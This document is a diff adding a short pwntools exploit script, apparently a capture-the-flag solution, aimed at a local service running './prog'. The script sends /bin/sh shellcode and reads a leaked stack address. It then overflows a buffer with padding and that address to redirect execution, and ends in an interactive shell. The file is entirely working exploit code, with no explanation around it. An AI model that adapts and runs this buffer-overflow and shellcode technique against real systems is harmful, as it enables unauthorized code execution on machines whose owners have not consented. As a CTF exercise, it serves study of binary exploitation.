@@ -1,0 +1,34 @@
+# coding=utf-8
+from pwn import *
+context.log_level='debug'
+context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+
+# s=ssh(host=host,port=port,user='CTFMan',password='guest')
+# io=s.run('/bin/bash')
+
+#io=process('./prog')
+io=remote('127.0.0.1',8001)
+
+elf=ELF('./prog')
+
+#libc_file=''
+
+s=lambda x:io.send(x)
+sa=lambda x,y:io.sendafter(x,y)
+sl=lambda x:io.sendline(x)
+sla=lambda x,y:io.sendlineafter(x,y)
+r=lambda x:io.recv(x)
+ru=lambda x:io.recvuntil(x)
+debug=lambda:gdb.attach(io)	
+
+payload=asm(shellcraft.sh())
+sla("I have a gift for you.\nWhat do you want?\n",payload)
+ru('0x')
+shell_addr=int(ru('.')[::-1][1:][::-1],16)
+print hex(shell_addr)
+print hex(shell_addr&(~0xfff))
+
+payload=b'a'*0x18+p64(shell_addr)
+sla('take it.\n',payload)
+
+io.interactive()
